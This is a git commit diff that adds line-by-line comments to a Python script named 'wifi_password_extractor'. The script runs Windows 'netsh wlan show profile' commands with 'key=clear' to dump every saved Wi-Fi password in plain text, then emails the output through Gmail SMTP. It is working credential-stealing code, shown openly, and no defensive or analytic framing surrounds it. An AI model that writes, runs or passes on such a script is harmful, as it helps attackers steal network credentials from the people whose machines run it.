c9b6027aa59f5ecfc06db815b8d0e7eb5536d0d4
Paweł Orzechowski <110523018+oziesiek@users.noreply.github.com>
2023-09-13 12:58:06 +0200

    Update execute_command.py
    comments

--- wifi_password_extractor/execute_command.py
+++ wifi_password_extractor/execute_command.py
@@ -1,23 +1,24 @@
-import subprocess, smtplib, re
+import subprocess  # Import the subprocess module for running external commands
+import smtplib  # Import the smtplib module for sending emails
+import re  # Import the re module for regular expressions
 
-
+# Function to send an email
 def send_mail(email, password, message):
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.starttls()
-    server.login(email, password)
-    server.sendmail(email, email, message)
-    server.quit()
-
+    server = smtplib.SMTP("smtp.gmail.com", 587)  # Create an SMTP server for Gmail
+    server.starttls()  # Start a TLS session for secure communication
+    server.login(email, password)  # Log in to the email account
+    server.sendmail(email, email, message)  # Send the email to itself (from and to the same address)
+    server.quit()  # Quit the SMTP server
 
 command = "netsh wlan show profile"
-networks = subprocess.check_output(command, shell=True).decode("utf-8")
-network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
-network_names_string = ' '.join(network_names_list)
+networks = subprocess.check_output(command, shell=True).decode("utf-8")  # Run a Windows command to list Wi-Fi profiles
+network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)  # Use regular expressions to extract profile names
+network_names_string = ' '.join(network_names_list)  # Join the extracted profile names into a single string
 
 result = ""
 for network_name in network_names_list:
-    command = "netsh wlan show profile " + network_name + " key=clear"
-    current_result = subprocess.check_output(command, shell=True).decode("utf-8")
-    result = str(result) + str(current_result)
+    command = "netsh wlan show profile " + network_name + " key=clear"  # Get detailed information for each profile
+    current_result = subprocess.check_output(command, shell=True).decode("utf-8")  # Run the command and capture the output
+    result = str(result) + str(current_result)  # Append the current result to the overall result
 
-send_mail("your@mail", "password", str(result))
+send_mail("your@mail", "password", str(result))  # Send the result as an email
